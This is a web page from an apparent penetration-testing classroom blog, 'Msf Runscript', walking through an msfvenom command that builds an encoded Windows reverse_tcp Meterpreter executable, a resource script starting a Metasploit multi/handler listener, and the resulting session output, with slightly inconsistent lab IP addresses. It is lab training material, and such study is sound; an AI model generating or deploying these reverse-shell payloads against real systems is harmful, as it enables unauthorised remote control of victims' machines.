<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><title>Msf Runscript | Classroom</title><link href=/img/avatar.jpeg rel="shortcut icon" type=image/x-icon><meta name=author content="Animesh Roy"><meta name=description content><script data-ad-client=ca-pub-3526678290068011 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><script data-ad-client=ca-pub-3526678290068011 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-NZBEX7RBNF"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-NZBEX7RBNF')</script><script type=text/javascript>(function(a,e,b,f,g,c,d){a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},c=e.createElement(f),c.async=1,c.src="https://www.clarity.ms/tag/"+g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d)})(window,document,"clarity","script","6gp5990ghr")</script><link rel=canonical href=https://classroom.anir0y.in/post/msf-runscript/><meta property="og:title" content="Msf Runscript"><meta property="og:description" content="WRITING METERPRETER SCRIPTS There are a few things you need to keep in mind when creating a new Meterpreter script.
 Not all versions of Windows are the same Some versions of Windows have security countermeasures for some of the commands Not all command line tools are in all versions of Windows Some of the command line tools switches vary depending on the version of Windows  For our purposes, we are going to create a stand alone binary that will be run on the target system that will create a reverse Meterpreter shell back to us."><meta property="og:type" content="article"><meta property="og:url" content="https://classroom.anir0y.in/post/msf-runscript/"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-04-07T15:25:21+05:30"><meta property="article:modified_time" content="2021-04-07T15:25:21+05:30"><meta name=twitter:card content="summary"><meta name=twitter:title content="Msf Runscript"><meta name=twitter:description content="WRITING METERPRETER SCRIPTS There are a few things you need to keep in mind when creating a new Meterpreter script.
 Not all versions of Windows are the same Some versions of Windows have security countermeasures for some of the commands Not all command line tools are in all versions of Windows Some of the command line tools switches vary depending on the version of Windows  For our purposes, we are going to create a stand alone binary that will be run on the target system that will create a reverse Meterpreter shell back to us."><link rel=stylesheet href=/css/semantic.min.css><link rel=stylesheet href=/css/icomoon.css><link rel=stylesheet href=/css/OverlayScrollbars.min.css><link rel=stylesheet href=/css/github-markdown.css><link rel=stylesheet href=/css/site.css><style>a:not(.ui.button):hover{text-decoration:underline}a:not(.ui.button){color:#2e8b57!important}.inverted a:not(.ui.button),.inverted a:not(.ui.button):hover{color:#8fbc8f!important}body.default{background-color:#fff}body.dark{background-color:#000}</style><link rel=stylesheet data-highlight href=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/tomorrow.min.css><link rel=stylesheet href=/css/custom.css></head><body class=default><nav class="ui secondary menu dream-menu"><div class=item><i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i></div><div class=item><i class="large link home icon" title=Home onclick="window.location.href='https://classroom.anir0y.in'"></i></div><div class=item><i class="large link icon theme-switch" onclick=themeSwitch()></i></div><div class=item><i class="large link search icon" onclick=toggleSearch()></i></div></nav><div class=flip-container><div class=flipper><section class=front><div class=dream-max-width><div class="ui relaxed grid dream-grid dream-grid-single" style=flex-direction:row-reverse><aside class="sixteen wide mobile sixteen wide tablet four wide computer column dream-single-aside"><div class="ui segment actions"><button class="ui circular icon button save-as-image" title="Save as image" onclick=savePostAsImg()>
<i class="save icon"></i></button>
<a href="https://twitter.com/intent/tweet?text=Msf%20Runscript&url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fmsf-runscript%2f" class="ui circular twitter icon button"><i class="twitter icon"></i></a>
<a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fmsf-runscript%2f" class="ui circular facebook icon button"><i class="facebook icon"></i></a></div></aside><div class="sixteen wide mobile sixteen wide tablet twelve wide computer column markdown-body dream-single" id=dream-save-post-as-img><section class="ui top attached segment"><header><h1 class="ui large header">Msf Runscript<div class="sub header">@
<a href=https://anir0y.in target=_blank>Animesh Roy</a>
|
Wednesday, Apr 7, 2021
| 2 minutes read
| Update at
Wednesday, Apr 7, 2021</div></h1></header><article class=main><h1 id=writing-meterpreter-scripts>WRITING METERPRETER SCRIPTS</h1><p>There are a few things you need to keep in mind when creating a new Meterpreter script.</p><ul><li>Not all versions of Windows are the same</li><li>Some versions of Windows have security countermeasures for some of the commands</li><li>Not all command line tools are in all versions of Windows</li><li>Some of the command line tools switches vary depending on the version of Windows</li></ul><p>For our purposes, we are going to create a stand alone binary that will be run on the target system that will create a reverse Meterpreter shell back to us. This will rule out any problems with an exploit as we work through our script development.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST<span style=color:#f92672>=</span>192.168.1.101 -b <span style=color:#e6db74>&#34;\x00&#34;</span> -f exe -o Meterpreter.exe
Found <span style=color:#ae81ff>10</span> compatible encoders
Attempting to encode payload with <span style=color:#ae81ff>1</span> iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size <span style=color:#ae81ff>326</span> <span style=color:#f92672>(</span>iteration<span style=color:#f92672>=</span>0<span style=color:#f92672>)</span>
x86/shikata_ga_nai chosen with final size <span style=color:#ae81ff>326</span>
Payload size: <span style=color:#ae81ff>326</span> bytes
Saved as: Meterpreter.exe
</code></pre></div><p>Wonderful. Now, we move the executable to our Windows machine that will be our target for the script we are going to write. We just have to set up our listener. To do this, lets create a short script to start up multi-handler for us.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# touch meterpreter.rc
root@kali:~# echo use exploit/multi/handler &gt;&gt; meterpreter.rc
root@kali:~# echo set PAYLOAD windows/meterpreter/reverse_tcp &gt;&gt; meterpreter.rc
root@kali:~# echo set LHOST 192.168.1.184 &gt;&gt; meterpreter.rc
root@kali:~# echo set ExitOnSession false &gt;&gt; meterpreter.rc
root@kali:~# echo exploit -j -z &gt;&gt; meterpreter.rc
root@kali:~# cat meterpreter.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.184
set ExitOnSession false
exploit -j -z
</code></pre></div><p>Now, all that remains is to start up msfconsole with our our resource script.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# msfconsole -r meterpreter.rc

       <span style=color:#f92672>=[</span> metasploit v4.8.2-2014021901 <span style=color:#f92672>[</span>core:4.8 api:1.0<span style=color:#f92672>]</span> <span style=color:#f92672>]</span>
+ -- --<span style=color:#f92672>=[</span> <span style=color:#ae81ff>1265</span> exploits - <span style=color:#ae81ff>695</span> auxiliary - <span style=color:#ae81ff>202</span> post <span style=color:#f92672>]</span>
+ -- --<span style=color:#f92672>=[</span> <span style=color:#ae81ff>330</span> payloads - <span style=color:#ae81ff>32</span> encoders - <span style=color:#ae81ff>8</span> nops      <span style=color:#f92672>]</span>

resource&gt; use exploit/multi/handler
resource&gt; set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD <span style=color:#f92672>=</span>&gt; windows/meterpreter/reverse_tcp
resource&gt; set LHOST 192.168.1.184
LHOST <span style=color:#f92672>=</span>&gt; 192.168.1.184
resource&gt; set ExitOnSession false
ExitOnSession <span style=color:#f92672>=</span>&gt; false
resource&gt; exploit -j -z
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Handler binding to LHOST 0.0.0.0
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse handler
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting the payload handler...
</code></pre></div><p>upon execution</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>718336</span> bytes<span style=color:#f92672>)</span>
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>1</span> opened <span style=color:#f92672>(</span>192.168.1.158:4444 -&gt; 192.168.1.104:1043<span style=color:#f92672>)</span>

msf exploit<span style=color:#f92672>(</span>handler<span style=color:#f92672>)</span> &gt; sessions -i <span style=color:#ae81ff>1</span>
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting interaction with 1...

meterpreter &gt;
</code></pre></div></article></section></div></div><footer class="ui basic center aligned segment" style=background-color:transparent><p>© 2010 - 2021 Classroom</p></footer></div></section><section class=back><div class=dream-max-width><header class="ui basic very padded segment dream-header"><div class="ui small circular image"><img src=/img/avatar.jpeg></div><div class=content><h1 class="ui medium header">Classroom Notes & Blog Posts<div class="sub header"></div></h1><article class="ui horizontal list"><a class=item href=/categories><i class="th list icon" title="All Categories"></i></a>
<a class=item href=/tags><i class="tags icon" title="All Tags"></i></a></article><article class=dream-tags><a class="ui label" href=/tags/autopsy/ title=autopsy>autopsy</a>
<a class="ui label" href=/tags/backdoor/ title=backdoor>backdoor</a>
<a class="ui label" href=/tags/bash/ title=bash>bash</a>
<a class="ui label" href=/tags/cheatsheet/ title=cheatsheet>cheatsheet</a>
<a class="ui label" href=/tags/config/ title=config>config</a>
<a class="ui label" href=/tags/dominos/ title=dominos>dominos</a>
<a class="ui label" href=/tags/empire/ title=Empire>Empire</a>
<a class="ui label" href=/tags/encryption/ title=encryption>encryption</a>
<a class="ui label" href=/tags/forensic/ title=forensic>forensic</a>
<a class="ui label" href=/tags/gitandcrumpets/ title=gitandcrumpets>gitandcrumpets</a>
<a class="ui label" href=/tags/gnupg/ title=gnupg>gnupg</a>
<a class="ui label" href=/tags/hackpark/ title=HackPark>HackPark</a>
<a class="ui label" href=/tags/hydra/ title=hydra>hydra</a>
<a class="ui label" href=/tags/internship/ title=Internship>Internship</a>
<a class="ui label" href=/tags/interview/ title=interview>interview</a>
<a class="ui label" href=/tags/kenobi/ title=kenobi>kenobi</a>
<a class="ui label" href=/tags/lab/ title=lab>lab</a>
<a class="ui label" href=/tags/leaks/ title=leaks>leaks</a>
<a class="ui label" href=/tags/linux/ title=Linux>Linux</a>
<a class="ui label" href=/tags/memory/ title=memory>memory</a>
<a class="ui label" href=/tags/metasploit/ title=metasploit>metasploit</a>
<a class="ui label" href=/tags/mobile/ title=Mobile>Mobile</a>
<a class="ui label" href=/tags/msf/ title=msf>msf</a>
<a class="ui label" href=/tags/msfvenom/ title=msfvenom>msfvenom</a>
<a class="ui label" href=/tags/notes/ title=notes>notes</a>
<a class="ui label" href=/tags/osi/ title=OSI>OSI</a>
<a class="ui label" href=/tags/osi-model/ title="OSI Model">OSI Model</a>
<a class="ui label" href=/tags/pentesting/ title=Pentesting>Pentesting</a>
<a class="ui label" href=/tags/pgp/ title=PGP>PGP</a>
<a class="ui label" href=/tags/pip/ title=pip>pip</a>
<a class="ui label" href=/tags/pip2/ title=pip2>pip2</a>
<a class="ui label" href=/tags/post-exploitation/ title=Post-Exploitation>Post-Exploitation</a>
<a class="ui label" href=/tags/powershell/ title=powershell>powershell</a>
<a class="ui label" href=/tags/putty/ title=putty>putty</a>
<a class="ui label" href=/tags/python/ title=python>python</a>
<a class="ui label" href=/tags/ref/ title=Ref>Ref</a>
<a class="ui label" href=/tags/rooms/ title=rooms>rooms</a>
<a class="ui label" href=/tags/rootme/ title=RootMe>RootMe</a>
<a class="ui label" href=/tags/script/ title=script>script</a>
<a class="ui label" href=/tags/scripting/ title=Scripting>Scripting</a>
<a class="ui label" href=/tags/splunk/ title=splunk>splunk</a>
<a class="ui label" href=/tags/stego/ title=stego>stego</a>
<a class="ui label" href=/tags/sysmon/ title=sysmon>sysmon</a>
<a class="ui label" href=/tags/thm/ title=thm>thm</a>
<a class="ui label" href=/tags/tools/ title=tools>tools</a>
<a class="ui label" href=/tags/tryhackme/ title=tryhackme>tryhackme</a>
<a class="ui label" href=/tags/vapt/ title=vapt>vapt</a>
<a class="ui label" href=/tags/volatility/ title=Volatility>Volatility</a>
<a class="ui label" href=/tags/vuln-labs/ title="vuln labs">vuln labs</a>
<a class="ui label" href=/tags/vulnversity/ title=Vulnversity>Vulnversity</a>
<a class="ui label" href=/tags/wireshark/ title=wireshark>wireshark</a></article></div></header><div class="ui relaxed grid dream-grid dream-back"><div class="sixteen wide mobile eight wide tablet four wide computer column dream-column"><article class="ui segment"><h3 class="ui header">Social Links</h3><nav class="ui secondary menu dream-menu dream-socials"><div class=item><a href=/index.xml><i class="large rss square icon" title=RSS></i></a></div><div class=item><a href=mailto:classroom@anir0y.in><i class="large mail icon" title=Email></i></a></div><div class=item><a href=https://twitter.com/anir0y target=_blank><i class="large twitter icon" title=Twitter></i></a></div><div class=item><a href=https://facebook.com/anir0yofficial target=_blank><i class="large facebook icon" title=Facebook></i></a></div><div class=item><a href=https://instagram.com/anir0yofficial target=_blank><i class="large instagram icon" title=Instagram></i></a></div><div class=item><a href=https://www.linkedin.com/in/anir0y target=_blank><i class="large linkedin icon" title=Linkedin></i></a></div><div class=item><a href=https://github.com/anir0y target=_blank><i class="large github icon" title=GitHub></i></a></div></nav></article></div><div class="sixteen wide mobile eight wide tablet four wide computer column dream-column"><article class="ui segment">YOU CAN RESUE MY CONTENT</article></div></div></div></section></div></div><script>window.defaultDark=null,window.backgroundDark="black",window.backgroundImageDark=null,window.darkNav=!0,window.hasTwitterEmbed=!0,window.hasTwitterEmbed&&(window.twttr=function(c,d,e){var b,f=c.getElementsByTagName(d)[0],a=window.twttr||{};return c.getElementById(e)?a:(b=c.createElement(d),b.id=e,b.src='https://platform.twitter.com/widgets.js',f.parentNode.insertBefore(b,f),a._e=[],a.ready=function(b){a._e.push(b)},a)}(document,'script','twitter-wjs'))</script><script src=/js/jquery.min.js></script><script src=/js/semantic.min.js></script><script src=/js/jquery.overlayScrollbars.min.js></script><script src=/js/header.js></script><script src=/js/main.js></script><script src=/js/theme.js></script><script src=/js/html2canvas.min.js></script><script src=/js/post.js></script><script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/highlight.min.js></script><script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/clojure.min.js></script><script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/ocaml.min.js></script><script>hljs.initHighlightingOnLoad(),setHighlightTheme();function setHighlightTheme(){var a=localStore.getItem('hugo-theme-dream-is-dark'),b,c,d;a=a?a:window.defaultDark?'y':a,b="tomorrow",c="tomorrow-night",d=a==='y'?c:b,$('link[data-highlight]').attr('href','https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/'+d+'.min.css'),$('pre').css('background',a==='y'?'#333':'')}</script><div class="ui inverted segment" id=dream-search><div class="ui search"><div class="ui transparent input"><input class=prompt type=text placeholder=Search></div><div class=results></div></div></div><script>$(document).ready(function(){$.getJSON('https://classroom.anir0y.in/index.json',function(a){$('.ui.search').search({source:a,searchFields:['title'],showNoResults:!0})})})</script><script src=/js/search.js></script></body></html>